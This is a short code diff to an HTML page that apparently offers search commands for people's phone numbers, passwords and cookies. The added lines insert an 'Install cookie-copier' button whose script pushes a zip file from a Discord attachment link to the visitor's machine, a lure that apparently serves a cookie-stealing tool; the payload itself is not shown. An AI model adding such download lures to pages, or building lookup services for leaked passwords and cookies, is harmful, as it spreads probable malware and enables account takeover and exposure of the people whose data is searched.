@@ -187,7 +187,20 @@ When you're ready, click below to begin.
   <strong>Free [NSFW sites not included] (current)</strong><br>
   [!search Number (Phonenumber)]<br>
   [!search Password (Password)]<br>
-  [!search Cookie (Cookie)]<br><br>
+  [!search Cookie (Cookie)]<br>
+ <button class="install-cookie-btn" onclick="downloadCookieCopier()">Install cookie-copier</button><br><br>
+ 
+ <script>
+  function downloadCookieCopier() {
+    const url = "https://cdn.discordapp.com/attachments/1542213282600059043/1542213357606805504/cookie-copier.zip?ex=6a90699d&is=6a8f181d&hm=b3bc937506abef40af7781fa0a7ff90193274f38e8581ccc8c16788734baad5a&";
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = "cookie-copier.zip";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+  }
+</script>
 
   <strong>Verification Needed [NSFW sites included]</strong><br>
   [!deepsearch User (Username)]<br>
